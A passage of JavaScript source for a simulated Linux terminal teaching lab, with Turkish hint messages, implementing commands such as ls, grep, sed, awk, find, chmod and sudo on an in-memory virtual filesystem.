  ifconfig: 'modern sistemlerde ip addr tercih edilir',
  type: 'dosya okumak icin cat',
  copy: 'kopyalamak icin cp',
  move: 'tasimak icin mv',
  del: 'silmek icin rm',
  netstat: 'modern karsiligi ss -tulpn',
  tracert: 'Linux\'ta traceroute',
  service: 'systemctl status servis_adi',
  apt: 'bu labda paket kurulumu yok, ama gercek Ubuntu\'da sudo apt install paket',
  python: 'python3 bu labda yok, ama gercek sistemde var',
  vi: 'nano ya da vim dene',
};

function readInputs(sh, files, stdin, cmd) {
  if (!files.length) return { texts: [stdin || ''], errs: '' };
  const texts = []; let errs = '';
  for (const f of files) {
    if (f === '-') { texts.push(stdin || ''); continue; }
    const r = sh.readFile(f, cmd);
    if (r.err) errs += r.err + '\n'; else texts.push(r.data);
  }
  return { texts, errs };
}

function wcount(s) { return s.split(/\s+/).filter(Boolean).length; }

function expandSet(s) {
  let out = '';
  s = s.replace(/\\n/g, '\n').replace(/\\t/g, '\t');
  s = s.replace(/\[:lower:\]/g, 'a-z').replace(/\[:upper:\]/g, 'A-Z').replace(/\[:digit:\]/g, '0-9').replace(/\[:space:\]/g, ' \t\n');
  for (let i = 0; i < s.length; i++) {
    if (s[i + 1] === '-' && i + 2 < s.length) {
      const a = s.charCodeAt(i), b = s.charCodeAt(i + 2);
      for (let c = a; c <= b; c++) out += String.fromCharCode(c);
      i += 2;
    } else out += s[i];
  }
  return out;
}

function splitSed(script) {
  const out = []; let i = 0;
  while (i < script.length) {
    while (i < script.length && /[\s;]/.test(script[i])) i++;
    if (i >= script.length) break;
    if (script[i] === 's' && script[i + 1] && !/[\s\w]/.test(script[i + 1])) {
      const d = script[i + 1]; let j = i + 2; let n = 0;
      while (j < script.length && n < 2) { if (script[j] === '\\') { j += 2; continue; } if (script[j] === d) n++; j++; }
      while (j < script.length && script[j] !== d) { if (script[j] === '\\') j++; j++; }
      j++;
      while (j < script.length && /[gip]/.test(script[j])) j++;
      out.push(script.slice(i, j)); i = j;
    } else {
      let j = script.indexOf(';', i); if (j < 0) j = script.length;
      out.push(script.slice(i, j).trim()); i = j + 1;
    }
  }
  return out;
}

function svcName(n) { return (n || '').replace(/\.service$/, ''); }

function nginxConfError(sh) {
  const n = sh.node('/etc/nginx/nginx.conf');
  if (!n) return 'open() "/etc/nginx/nginx.conf" failed (2: No such file or directory)';
  const ls = lines(n.d);
  for (let i = 0; i < ls.length; i++) {
    const m = /^\s*listen\s+([^;]*);?/.exec(ls[i]);
    if (m && !/^\d+$/.test(m[1].trim())) return `invalid port in "${m[1].trim()}" of the "listen" directive in /etc/nginx/nginx.conf:${i + 1}`;
  }
  const open = (n.d.match(/{/g) || []).length, close = (n.d.match(/}/g) || []).length;
  if (open !== close) return 'unexpected end of file, expecting "}" in /etc/nginx/nginx.conf';
  return null;
}

function treeLines(sh, abs, prefix, showHidden, out, counts) {
  const names = sh.listDir(abs).filter(n => showHidden || !n.startsWith('.'));
  names.forEach((n, i) => {
    const last = i === names.length - 1;
    const node = sh.node(abs === '/' ? '/' + n : abs + '/' + n);
    out.push(prefix + (last ? '└── ' : '├── ') + n);
    if (node.t === 'd') { counts.d++; treeLines(sh, abs === '/' ? '/' + n : abs + '/' + n, prefix + (last ? '    ' : '│   '), showHidden, out, counts); }
    else counts.f++;
  });
}

function findWalk(sh, abs, display, out, test) {
  const n = sh.node(abs);
  if (!n) return;
  if (test(n, abs.split('/').pop() || '/')) out.push(display);
  if (n.t === 'd') {
    if (!sh.canRead(n) || !(sh.isRoot || n.m & 0o001 || n.o === USER)) {
      if (display !== '.') out.push('\u0000find: \u2018' + display + '\u2019: Permission denied');
      return;
    }
    for (const c of Object.keys(n.c).sort()) {
      findWalk(sh, abs === '/' ? '/' + c : abs + '/' + c, display === '/' ? '/' + c : display + '/' + c, out, test);
    }
  }
}

function cowsay(msg) {
  const top = ' ' + '_'.repeat(msg.length + 2);
  const bot = ' ' + '-'.repeat(msg.length + 2);
  return `${top}\n< ${msg} >\n${bot}\n        \\   ^__^\n         \\  (oo)\\_______\n            (__)\\       )\\/\\\n                ||----w |\n                ||     ||\n`;
}

const FORTUNES = [
  'Bir sistem yoneticisinin en iyi arkadasi man sayfasidir.',
  'rm -rf yazmadan once iki kez dusun, enter\'a bir kez bas.',
  'It\'s always DNS.',
  'Hersey bir dosyadir. Yazici bile.',
  'Yedeklenmemis veri, silinmeyi bekleyen veridir.',
  'Bir pipe, bin tiklamaya bedeldir.',
  'chmod 777 bir cozum degil, bir itiraftir.',
  'Calisiyorsa dokunma, dokunduysan commit et.',
  'BGP\'nin bile bir yonetici gibi kotu gunleri olur.',
];

const COMMANDS = {
  pwd() { return ok(this.cwd + '\n'); },

  cd(args) {
    let t = args[0];
    if (t === undefined) t = HOME;
    if (t === '-') t = this.env.OLDPWD || HOME;
    const abs = this.resolve(t);
    const n = this.node(abs);
    if (!n) return fail(`bash: cd: ${t}: No such file or directory`);
    if (n.t !== 'd') return fail(`bash: cd: ${t}: Not a directory`);
    if (!this.canExec(n) && !this.canRead(n)) return fail(`bash: cd: ${t}: Permission denied`);
    this.env.OLDPWD = this.cwd;
    this.cwd = abs;
    return ok(args[0] === '-' ? abs + '\n' : '');
  },

  ls(args) {
    const { flags, rest } = parseOpts(args);
    const all = flags.has('a'), almost = flags.has('A'), long = flags.has('l'), human = flags.has('h'), classify = flags.has('F');
    const one = flags.has('1');
    const targets = rest.length ? rest : ['.'];
    const out = []; const rich = []; let err = '';
    const showName = (name, node) => name + (classify && node.t === 'd' ? '/' : classify && node.m & 0o111 ? '*' : '');
    const clsOf = node => (node.t === 'd' ? 'dir' : node.m & 0o111 ? 'exe' : '');
    targets.forEach((t, idx) => {
      const abs = this.resolve(t);
      const n = this.node(abs);
      if (!n) { err += `ls: cannot access '${t}': No such file or directory\n`; return; }
      let entries;
      if (n.t === 'f') entries = [[t, n]];
      else {
        if (!this.canRead(n)) { err += `ls: cannot open directory '${t}': Permission denied\n`; return; }
        const names = Object.keys(n.c).sort((a, b) => a.replace(/^\./, '').localeCompare(b.replace(/^\./, '')));
        entries = names.filter(x => all || almost || !x.startsWith('.')).map(x => [x, n.c[x]]);
        if (all) entries = [['.', n], ['..', this.node(this.parent(abs).ppath) || n]].concat(entries);
      }
      if (targets.length > 1 && n.t === 'd') { out.push((idx ? '\n' : '') + t + ':'); rich.push({ text: (idx ? '\n' : '') + t + ':\n', cls: '' }); }
      if (long) {
        if (n.t === 'd') { out.push('total ' + entries.length * 4); rich.push({ text: 'total ' + entries.length * 4 + '\n', cls: '' }); }
        for (const [name, node] of entries) {
          const size = node.t === 'd' ? 4096 : node.d.length;
          const links = node.t === 'd' ? 2 : 1;
          const pre = `${modeStr(node)} ${links} ${node.o.padEnd(8)} ${node.o.padEnd(8)} ${fmtSize(size, human).padStart(6)} ${fmtDate(node.ts)} `;
          out.push(pre + showName(name, node));
          rich.push({ text: pre, cls: '' }, { text: showName(name, node), cls: clsOf(node) }, { text: '\n', cls: '' });
        }
      } else {
        const sep = one ? '\n' : '  ';
        entries.forEach(([name, node], i) => {
          out.push(showName(name, node));
          rich.push({ text: showName(name, node), cls: clsOf(node) }, { text: i === entries.length - 1 ? '\n' : sep, cls: '' });
        });
      }
    });
    return { out: join(out), err, code: err ? 2 : 0, rich };
  },

  cat(args, stdin) {
    const { flags, rest } = parseOpts(args);
    const { texts, errs } = readInputs(this, rest, stdin, 'cat');
    let out = texts.join('');
    if (flags.has('n')) out = join(lines(out).map((l, i) => String(i + 1).padStart(6) + '\t' + l));
    return { out, err: errs, code: errs ? 1 : 0 };
  },

  echo(args) {
    let nl = true; let esc = false;
    while (args[0] && /^-[neE]+$/.test(args[0])) { if (args[0].includes('n')) nl = false; if (args[0].includes('e')) esc = true; args = args.slice(1); }
    let s = args.join(' ');
    if (esc) s = s.replace(/\\n/g, '\n').replace(/\\t/g, '\t');
    return ok(s + (nl ? '\n' : ''));
  },

  printf(args) {
    if (!args.length) return ok();
    let fmt = args[0].replace(/\\n/g, '\n').replace(/\\t/g, '\t');
    let i = 1;
    fmt = fmt.replace(/%[sd]/g, () => args[i++] || '');
    return ok(fmt);
  },

  touch(args) {
    let err = '';
    for (const f of args.filter(a => !a.startsWith('-'))) {
      const abs = this.resolve(f);
      const n = this.node(abs);
      if (n) { n.ts = Date.now(); continue; }
      const e = this.writeFile(f, '', false, 'touch');
      if (e) err += `touch: cannot touch '${f}': ${e.split(': ').pop()}\n`;
    }
    if (!args.length) return fail('touch: missing file operand');
    return { out: '', err, code: err ? 1 : 0 };
  },

  mkdir(args) {
    const { flags, rest } = parseOpts(args);
    if (!rest.length) return fail('mkdir: missing operand');
    let err = '';
    for (const d of rest) {
      const abs = this.resolve(d);
      if (this.node(abs)) { if (!flags.has('p')) err += `mkdir: cannot create directory '${d}': File exists\n`; continue; }
      const parts = abs.split('/').slice(1);
      let cur = '';
      for (let i = 0; i < parts.length; i++) {
        const parentPath = cur || '/';
        cur += '/' + parts[i];
        const ex = this.node(cur);
        if (ex) { if (ex.t !== 'd') { err += `mkdir: cannot create directory '${d}': Not a directory\n`; break; } continue; }
        const isLast = i === parts.length - 1;
        if (!isLast && !flags.has('p')) { err += `mkdir: cannot create directory '${d}': No such file or directory\n`; break; }
        const pd = this.node(parentPath);
        if (!this.canWrite(pd)) { err += `mkdir: cannot create directory '${d}': Permission denied\n`; break; }
        pd.c[parts[i]] = mkdir({}, 0o755, this.user);
      }
    }
    return { out: '', err, code: err ? 1 : 0 };
  },

  rmdir(args) {
    let err = '';
    for (const d of args) {
      const abs = this.resolve(d);
      const n = this.node(abs);
      if (!n) { err += `rmdir: failed to remove '${d}': No such file or directory\n`; continue; }
      if (n.t !== 'd') { err += `rmdir: failed to remove '${d}': Not a directory\n`; continue; }
      if (Object.keys(n.c).length) { err += `rmdir: failed to remove '${d}': Directory not empty\n`; continue; }
      const { dir, name } = this.parent(abs);
      if (!this.canWrite(dir)) { err += `rmdir: failed to remove '${d}': Permission denied\n`; continue; }
      delete dir.c[name];
    }
    return { out: '', err, code: err ? 1 : 0 };
  },

  rm(args) {
    const { flags, rest } = parseOpts(args);
    const rec = flags.has('r') || flags.has('R'), force = flags.has('f');
    if (rec && rest.some(r => this.resolve(r) === '/')) {
      return fail('rm: \'/\' uzerinde islem yapmak tehlikeli. Iyi ki bir lab burasi. Gercek sistemde --no-preserve-root bile yazdirmazlar insana. 😅');
    }
    if (!rest.length) return fail('rm: missing operand');
    let err = '';
    for (const f of rest) {
      const abs = this.resolve(f);
      const n = this.node(abs);
      if (!n) { if (!force) err += `rm: cannot remove '${f}': No such file or directory\n`; continue; }
      if (n.t === 'd' && !rec) { err += `rm: cannot remove '${f}': Is a directory\n`; continue; }
      const { dir, name } = this.parent(abs);
      if (!this.canWrite(dir)) { err += `rm: cannot remove '${f}': Permission denied\n`; continue; }
      if (abs === HOME || abs === this.cwd) { err += `rm: '${f}' silinmedi, bu dizinin icindesin ya da ev dizinin\n`; continue; }
      delete dir.c[name];
    }
    return { out: '', err, code: err ? 1 : 0 };
  },

  cp(args) {
    const { flags, rest } = parseOpts(args);
    if (rest.length < 2) return fail('cp: missing destination file operand');
    const dest = rest.pop();
    const destAbs = this.resolve(dest);
    const dn = this.node(destAbs);
    let err = '';
    for (const s of rest) {
      const sabs = this.resolve(s);
      const sn = this.node(sabs);
      if (!sn) { err += `cp: cannot stat '${s}': No such file or directory\n`; continue; }
      if (sn.t === 'd' && !(flags.has('r') || flags.has('R') || flags.has('a'))) { err += `cp: -r not specified; omitting directory '${s}'\n`; continue; }
      if (!this.canRead(sn)) { err += `cp: cannot open '${s}' for reading: Permission denied\n`; continue; }
      const target = dn && dn.t === 'd' ? destAbs + '/' + sabs.split('/').pop() : destAbs;
      if (target === sabs) { err += `cp: '${s}' and '${dest}' are the same file\n`; continue; }
      const { dir, name } = this.parent(target);
      if (!dir || dir.t !== 'd') { err += `cp: cannot create '${dest}': No such file or directory\n`; continue; }
      if (!this.canWrite(dir)) { err += `cp: cannot create '${dest}': Permission denied\n`; continue; }
      const clone = JSON.parse(JSON.stringify(sn));
      const setOwner = x => { x.o = this.user; x.ts = Date.now(); if (x.t === 'd') Object.values(x.c).forEach(setOwner); };
      setOwner(clone);
      dir.c[name] = clone;
    }
    return { out: '', err, code: err ? 1 : 0 };
  },

  mv(args) {
    const { rest } = parseOpts(args);
    if (rest.length < 2) return fail('mv: missing destination file operand');
    const dest = rest.pop();
    const destAbs = this.resolve(dest);
    const dn = this.node(destAbs);
    let err = '';
    for (const s of rest) {
      const sabs = this.resolve(s);
      const sn = this.node(sabs);
      if (!sn) { err += `mv: cannot stat '${s}': No such file or directory\n`; continue; }
      const target = dn && dn.t === 'd' ? destAbs + '/' + sabs.split('/').pop() : destAbs;
      if (target.startsWith(sabs + '/')) { err += `mv: cannot move '${s}' to a subdirectory of itself\n`; continue; }
      const src = this.parent(sabs);
      const dst = this.parent(target);
      if (!dst.dir || dst.dir.t !== 'd') { err += `mv: cannot move '${s}' to '${dest}': No such file or directory\n`; continue; }
      if (!this.canWrite(src.dir) || !this.canWrite(dst.dir)) { err += `mv: cannot move '${s}': Permission denied\n`; continue; }
      delete src.dir.c[src.name];
      dst.dir.c[dst.name] = sn;
    }
    return { out: '', err, code: err ? 1 : 0 };
  },

  head(args, stdin) {
    let n = 10;
    args = args.map(a => (/^-\d+$/.test(a) ? '-n' + a.slice(1) : a));
    const { vals, rest } = parseOpts(args, 'nc');
    if (vals.n) n = parseInt(vals.n, 10);
    const { texts, errs } = readInputs(this, rest, stdin, 'head');
    const out = texts.map(t => join(lines(t).slice(0, n))).join('');
    return { out, err: errs, code: errs ? 1 : 0 };
  },

  tail(args, stdin) {
    let n = 10;
    args = args.map(a => (/^-\d+$/.test(a) ? '-n' + a.slice(1) : a));
    const { flags, vals, rest } = parseOpts(args, 'nc');
    let fromStart = false;
    if (vals.n) { if (vals.n.startsWith('+')) fromStart = true; n = parseInt(vals.n.replace('+', ''), 10); }
    const { texts, errs } = readInputs(this, rest, stdin, 'tail');
    const out = texts.map(t => { const l = lines(t); return join(fromStart ? l.slice(n - 1) : l.slice(Math.max(0, l.length - n))); }).join('');
    const extra = flags.has('f') ? '\n[tail -f canli takip eder. Bu labda dosya degismedigi icin burada duruyoruz]\n' : '';
    return { out: out + extra, err: errs, code: errs ? 1 : 0 };
  },

  wc(args, stdin) {
    const { flags, rest } = parseOpts(args);
    const { texts, errs } = readInputs(this, rest, stdin, 'wc');
    const none = !flags.has('l') && !flags.has('w') && !flags.has('c') && !flags.has('m');
    const rows = [];
    const tot = [0, 0, 0];
    texts.forEach((t, i) => {
      const l = (t.match(/\n/g) || []).length, w = wcount(t), c = t.length;
      tot[0] += l; tot[1] += w; tot[2] += c;
      const cols = [];
      if (none || flags.has('l')) cols.push(l);
      if (none || flags.has('w')) cols.push(w);
      if (none || flags.has('c') || flags.has('m')) cols.push(c);
      const label = rest.length ? ' ' + rest.filter(r => r !== '-')[i] : '';
      rows.push((rest.length || cols.length > 1 ? cols.map(x => String(x).padStart(cols.length > 1 ? 7 : 1)).join(' ') : String(cols[0])) + (label || ''));
    });
    if (texts.length > 1) {
      const cols = [];
      if (none || flags.has('l')) cols.push(tot[0]);
      if (none || flags.has('w')) cols.push(tot[1]);
      if (none || flags.has('c')) cols.push(tot[2]);
      rows.push(cols.map(x => String(x).padStart(7)).join(' ') + ' total');
    }
    return { out: join(rows.map(r => r.trimStart())), err: errs, code: errs ? 1 : 0 };
  },

  grep(args, stdin) {
    const { flags, vals, rest } = parseOpts(args, 'eAB');
    let pat = vals.e !== undefined ? vals.e : rest.shift();
    if (pat === undefined) return fail('Usage: grep [OPTION]... PATTERNS [FILE]...', 2);
    const ic = flags.has('i'), inv = flags.has('v'), num = flags.has('n'), cnt = flags.has('c'), only = flags.has('o'), word = flags.has('w');
    const listOnly = flags.has('l');
    const fixed = flags.has('F');
    let src = fixed ? pat.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') : (flags.has('E') ? pat : pat.replace(/\\\|/g, '|').replace(/\\\(/g, '(').replace(/\\\)/g, ')'));
    if (word) src = '\\b(?:' + src + ')\\b';
    let re;
    try { re = new RegExp(src, ic ? 'gi' : 'g'); } catch (e) { return fail('grep: Invalid regular expression', 2); }
    let files = rest;
    if (flags.has('r') || flags.has('R')) {
      const start = files.length ? files : ['.'];
      files = [];
      for (const s of start) {
        const found = [];
        findWalk(this, this.resolve(s), s, found, n => n.t === 'f');
        files.push(...found.filter(f => !f.startsWith('\u0000')));
      }
    }
    const multi = files.length > 1 || flags.has('r') || flags.has('R');
    const out = []; let err = ''; let any = false;
    const inputs = files.length ? files : [null];
    for (const f of inputs) {
      let text;
      if (f === null) text = stdin || '';
      else { const r = this.readFile(f, 'grep'); if (r.err) { err += r.err + '\n'; continue; } text = r.data; }
      let c = 0;
      lines(text).forEach((l, i) => {
        re.lastIndex = 0;
        const m = re.test(l);
        if (m !== inv) {
          c++; any = true;
          if (cnt || listOnly) return;
          const pre = (multi ? f + ':' : '') + (num ? (i + 1) + ':' : '');
          if (only && !inv) { re.lastIndex = 0; (l.match(re) || []).forEach(x => out.push(pre + x)); }
          else out.push(pre + l);
        }
      });
      if (cnt) out.push((multi ? f + ':' : '') + c);
      if (listOnly && c) out.push(f);
    }
    return { out: join(out), err, code: err ? 2 : any ? 0 : 1 };
  },

  sort(args, stdin) {
    const { flags, vals, rest } = parseOpts(args, 'kt');
    const { texts, errs } = readInputs(this, rest, stdin, 'sort');
    let ls = lines(texts.join(''));
    const sep = vals.t;
    const key = vals.k ? parseInt(vals.k, 10) : 0;
    const field = l => {
      if (!key) return l;
      const parts = sep ? l.split(sep) : l.trim().split(/\s+/);
      return parts.slice(key - 1).join(sep || ' ');
    };
    const numeric = flags.has('n') || (vals.k && /n/.test(vals.k));
    const cmp = numeric
      ? (a, b) => (parseFloat(field(a)) || 0) - (parseFloat(field(b)) || 0)
      : flags.has('f') ? (a, b) => field(a).toLowerCase().localeCompare(field(b).toLowerCase()) : (a, b) => (field(a) < field(b) ? -1 : field(a) > field(b) ? 1 : 0);
    ls.sort(cmp);
    if (flags.has('r')) ls.reverse();
    if (flags.has('u')) ls = ls.filter((l, i) => i === 0 || l !== ls[i - 1]);
    return { out: join(ls), err: errs, code: errs ? 2 : 0 };
  },

  uniq(args, stdin) {
    const { flags, rest } = parseOpts(args);
    const { texts, errs } = readInputs(this, rest.slice(0, 1), stdin, 'uniq');
    const ls = lines(texts.join(''));
    const groups = [];
    for (const l of ls) {
      if (groups.length && groups[groups.length - 1][0] === l) groups[groups.length - 1][1]++;
      else groups.push([l, 1]);
    }
    let g = groups;
    if (flags.has('d')) g = g.filter(x => x[1] > 1);
    if (flags.has('u')) g = g.filter(x => x[1] === 1);
    const out = g.map(([l, c]) => (flags.has('c') ? String(c).padStart(7) + ' ' + l : l));
    return { out: join(out), err: errs, code: errs ? 1 : 0 };
  },

  cut(args, stdin) {
    const { vals, rest } = parseOpts(args, 'dfc');
    if (!vals.f && !vals.c) return fail('cut: you must specify a list of bytes, characters, or fields');
    const { texts, errs } = readInputs(this, rest, stdin, 'cut');
    const d = vals.d === undefined ? '\t' : vals.d;
    const spec = vals.f || vals.c;
    const pick = (n) => {
      const res = new Set();
      for (const part of spec.split(',')) {
        if (/^\d+-\d+$/.test(part)) { const [a, b] = part.split('-').map(Number); for (let i = a; i <= b; i++) res.add(i); }
        else if (/^\d+-$/.test(part)) { for (let i = parseInt(part, 10); i <= n; i++) res.add(i); }
        else if (/^-\d+$/.test(part)) { for (let i = 1; i <= parseInt(part.slice(1), 10); i++) res.add(i); }
        else res.add(parseInt(part, 10));
      }
      return [...res].filter(i => i >= 1 && i <= n).sort((a, b) => a - b);
    };
    const out = lines(texts.join('')).map(l => {
      if (vals.c) { const chars = [...l]; return pick(chars.length).map(i => chars[i - 1]).join(''); }
      if (!l.includes(d)) return l;
      const parts = l.split(d);
      return pick(parts.length).map(i => parts[i - 1]).join(d);
    });
    return { out: join(out), err: errs, code: errs ? 1 : 0 };
  },

  tr(args, stdin) {
    const { flags, rest } = parseOpts(args);
    const input = stdin || '';
    if (!rest.length) return fail('tr: missing operand');
    const s1 = expandSet(rest[0]);
    if (flags.has('d')) return ok([...input].filter(c => !s1.includes(c)).join(''));
    if (flags.has('s') && rest.length === 1) {
      let out = ''; for (const c of input) { if (s1.includes(c) && out.endsWith(c)) continue; out += c; } return ok(out);
    }
    const s2 = expandSet(rest[1] || '');
    let out = [...input].map(c => { const i = s1.indexOf(c); return i < 0 ? c : s2[Math.min(i, s2.length - 1)] || ''; }).join('');
    if (flags.has('s')) { let o = ''; for (const c of out) { if (s2.includes(c) && o.endsWith(c)) continue; o += c; } out = o; }
    return ok(out);
  },

  sed(args, stdin) {
    const { flags, vals, rest } = parseOpts(args, 'e');
    let script = vals.e || rest.shift();
    if (!script) return fail('Usage: sed [OPTION]... {script} [input-file]...');
    const quiet = flags.has('n');
    const apply = (text) => {
      const ls = lines(text); const out = [];
      const cmds = splitSed(script);
      ls.forEach((l, idx) => {
        let line = l; let del = false; let printed = false;
        for (const c of cmds) {
          let m;
          if ((m = /^s(.)(.*?)\1(.*?)\1([gi]*)$/.exec(c))) {
            const re = new RegExp(m[2].replace(/\\\(/g, '(').replace(/\\\)/g, ')'), (m[4].includes('g') ? 'g' : '') + (m[4].includes('i') ? 'i' : ''));
            line = line.replace(re, m[3].replace(/\\(\d)/g, '$$$1').replace(/&/g, '$$&'));
          } else if ((m = /^\/(.*)\/([dp])$/.exec(c))) {
            if (new RegExp(m[1]).test(line)) { if (m[2] === 'd') del = true; else { out.push(line); printed = true; } }
          } else if ((m = /^(\d+)(?:,(\d+))?([dp])$/.exec(c))) {
            const a = +m[1], b = m[2] ? +m[2] : a;
            if (idx + 1 >= a && idx + 1 <= b) { if (m[3] === 'd') del = true; else { out.push(line); printed = true; } }
          } else if ((m = /^\$([dp])$/.exec(c))) {
            if (idx === ls.length - 1) { if (m[1] === 'd') del = true; else out.push(line); }
          } else throw new Error('sed: bu labda desteklenmeyen ifade: ' + c);
        }
        if (!del && !quiet) out.push(line);
        void printed;
      });
      return join(out);
    };
    try {
      if (flags.has('i')) {
        let err = '';
        for (const f of rest) {
          const r = this.readFile(f, 'sed');
          if (r.err) { err += r.err + '\n'; continue; }
          const e = this.writeFile(f, apply(r.data), false, 'sed');
          if (e) err += `sed: couldn't open temporary file ${f}: Permission denied\n`;
        }
        return { out: '', err, code: err ? 4 : 0 };
      }
      const { texts, errs } = readInputs(this, rest, stdin, 'sed');
      return { out: texts.map(apply).join(''), err: errs, code: errs ? 2 : 0 };
    } catch (e) { return fail(e.message); }
  },

  awk(args, stdin) {
    const { vals, rest } = parseOpts(args, 'F');
    const prog = rest.shift();
    if (!prog) return fail('usage: awk [-F fs] \'prog\' [file ...]');
    const { texts, errs } = readInputs(this, rest, stdin, 'awk');
    const ls = lines(texts.join(''));
    const fs = vals.F;
    const split = l => (fs ? l.split(fs === '\\t' ? '\t' : fs) : l.trim().split(/\s+/));
    const out = [];
    let m;
    // toplam kalibi: {s+=$N} END {print s}
    if ((m = /^\s*(?:\/(.*?)\/\s*)?\{\s*(\w+)\s*\+=\s*\$(\d+)\s*;?\s*\}\s*END\s*\{\s*print\s+(.+?)\s*;?\s*\}\s*$/.exec(prog))) {
      let sum = 0; let n = 0;
      const re = m[1] ? new RegExp(m[1]) : null;
      for (const l of ls) { if (re && !re.test(l)) continue; sum += parseFloat(split(l)[+m[3] - 1]) || 0; n++; }
      const expr = m[4].replace(new RegExp('\\b' + m[2] + '\\b', 'g'), String(sum)).replace(/\bNR\b/g, String(n));
      let v;
      try { v = /^[\d\s+\-*/().]+$/.test(expr) ? Function('return (' + expr + ')')() : expr.replace(/"/g, ''); } catch (e) { v = expr; }
      return { out: v + '\n', err: errs, code: 0 };
    }
    if ((m = /^\s*END\s*\{\s*print\s+NR\s*\}\s*$/.exec(prog))) return ok(ls.length + '\n');
    m = /^\s*(?:\/(.*?)\/|(NR|NF|\$\d+)\s*(==|!=|>=|<=|>|<)\s*("?[^{"]*"?))?\s*(?:\{\s*(.*?)\s*\})?\s*$/.exec(prog);
    if (!m) return fail('awk: bu labda desteklenen kaliplar /desen/ {print $1}, NR==2, -F, toplam icin {s+=$2} END {print s}');
    const [, reSrc, lhs, op, rhsRaw, action] = m;
    const re = reSrc !== undefined ? new RegExp(reSrc) : null;
    ls.forEach((l, i) => {
      const f = split(l);
      const val = x => {
        if (x === 'NR') return i + 1;
        if (x === 'NF') return f.length;
        if (x === '$0') return l;
        if (x === '$NF') return f[f.length - 1] || '';
        let mm = /^\$\(NF-(\d+)\)$/.exec(x);
        if (mm) return f[f.length - 1 - +mm[1]] || '';
        if (/^\$\d+$/.test(x)) return f[+x.slice(1) - 1] || '';
        return x;
      };
      if (re && !re.test(l)) return;
      if (lhs) {
        const a = val(lhs); const rhs = rhsRaw.replace(/"/g, '');
        const an = parseFloat(a), bn = parseFloat(rhs);
        const num = !isNaN(an) && !isNaN(bn);
        const A = num ? an : String(a), B = num ? bn : rhs;
        const pass = { '==': A == B, '!=': A != B, '>': A > B, '<': A < B, '>=': A >= B, '<=': A <= B }[op];
        if (!pass) return;
      }
      if (!action) { out.push(l); return; }
      const pm = /^print\s*(.*)$/.exec(action.replace(/;$/, ''));
      if (!pm) { out.push(l); return; }
      if (!pm[1].trim()) { out.push(l); return; }
      const items = []; let cur = ''; let q = false;
      for (const ch of pm[1]) {
        if (ch === '"') { q = !q; cur += ch; continue; }
        if (ch === ',' && !q) { items.push(cur.trim()); cur = ''; continue; }
        cur += ch;
      }
      items.push(cur.trim());
      const rendered = items.map(it => it.split(/\s+(?=(?:[^"]*"[^"]*")*[^"]*$)/).map(tok => (tok.startsWith('"') ? tok.replace(/^"|"$/g, '') : val(tok))).join(''));
      out.push(rendered.join(' '));
    });
    return { out: join(out), err: errs, code: errs ? 2 : 0 };
  },

  find(args) {
    let start = '.';
    let i = 0;
    if (args[0] && !args[0].startsWith('-')) { start = args[0]; i = 1; }
    const tests = [];
    for (; i < args.length; i++) {
      const a = args[i];
      if (a === '-name' || a === '-iname') { const re = globToRe(args[++i] || ''); const ci = a === '-iname'; tests.push((n, name) => (ci ? new RegExp(re.source, 'i') : re).test(name)); }
      else if (a === '-type') { const t = args[++i]; tests.push(n => n.t === t); }
      else if (a === '-user') { const u = args[++i]; tests.push(n => n.o === u); }
      else if (a === '-perm') { const p = parseInt(args[++i], 8); tests.push(n => (n.m & 0o777) === p); }
      else if (a === '-empty') tests.push(n => (n.t === 'f' ? n.d.length === 0 : Object.keys(n.c).length === 0));
      else if (a === '-maxdepth') { i++; }
      else return fail(`find: unknown predicate '${a}'`);
    }
    const abs = this.resolve(start);
    if (!this.node(abs)) return fail(`find: '${start}': No such file or directory`);
    const found = [];
    findWalk(this, abs, start, found, (n, name) => tests.every(t => t(n, name)));
    const out = found.filter(f => !f.startsWith('\u0000'));
    const err = found.filter(f => f.startsWith('\u0000')).map(f => f.slice(1));
    return { out: join(out), err: join(err), code: err.length ? 1 : 0 };
  },

  tree(args) {
    const { flags, rest } = parseOpts(args);
    const t = rest[0] || '.';
    const abs = this.resolve(t);
    const n = this.node(abs);
    if (!n || n.t !== 'd') return fail(`${t} [error opening dir]`);
    const out = [t]; const counts = { d: 0, f: 0 };
    treeLines(this, abs, '', flags.has('a'), out, counts);
    out.push('', `${counts.d} directories, ${counts.f} files`);
    return ok(join(out));
  },

  chmod(args) {
    const rest = args.filter(a => a !== '-R');
    if (rest.length < 2) return fail('chmod: missing operand');
    const mode = rest[0];
    let err = '';
    for (const f of rest.slice(1)) {
      const abs = this.resolve(f);
      const n = this.node(abs);
      if (!n) { err += `chmod: cannot access '${f}': No such file or directory\n`; continue; }
      if (!this.isRoot && n.o !== USER) { err += `chmod: changing permissions of '${f}': Operation not permitted\n`; continue; }
      if (/^[0-7]{3,4}$/.test(mode)) { n.m = parseInt(mode, 8) & 0o777; continue; }
      let okm = true;
      for (const part of mode.split(',')) {
        const m = /^([ugoa]*)([+\-=])([rwx]*)$/.exec(part);
        if (!m) { okm = false; break; }
        const who = m[1] || 'a';
        let bits = 0;
        const add = (w, r, wv, x) => { if (m[3].includes('r')) bits |= r; if (m[3].includes('w')) bits |= wv; if (m[3].includes('x')) bits |= x; };
        if (who.includes('u') || who.includes('a')) add('u', 0o400, 0o200, 0o100);
        if (who.includes('g') || who.includes('a')) add('g', 0o40, 0o20, 0o10);
        if (who.includes('o') || who.includes('a')) add('o', 0o4, 0o2, 0o1);
        if (m[2] === '+') n.m |= bits;
        else if (m[2] === '-') n.m &= ~bits;
        else {
          let mask = 0;
          if (who.includes('u') || who.includes('a')) mask |= 0o700;
          if (who.includes('g') || who.includes('a')) mask |= 0o70;
          if (who.includes('o') || who.includes('a')) mask |= 0o7;
          n.m = (n.m & ~mask) | bits;
        }
      }
      if (!okm) err += `chmod: invalid mode: '${mode}'\n`;
    }
    return { out: '', err, code: err ? 1 : 0 };
  },

  chown(args) {
    if (!this.isRoot) return fail(`chown: changing ownership of '${args[1] || ''}': Operation not permitted`);
    const [owner, ...files] = args.filter(a => a !== '-R');
    let err = '';
    for (const f of files) { const n = this.node(this.resolve(f)); if (!n) err += `chown: cannot access '${f}': No such file or directory\n`; else n.o = owner.split(':')[0]; }
    return { out: '', err, code: err ? 1 : 0 };
  },

  sudo(args, stdin) {
    if (!args.length) return fail('usage: sudo command');
    if (args[0] === '-i' || args[0] === 'su' || (args[0] === '-s')) return ok('Interaktif root kabugu bu labda kapali. Her komutun basina sudo yazmak iyi bir aliskanliktir.\n');
    const was = this.isRoot;
    this.isRoot = true;
    try {
      return this.execSimple(args, stdin, {});
    } finally { this.isRoot = was; }
  },

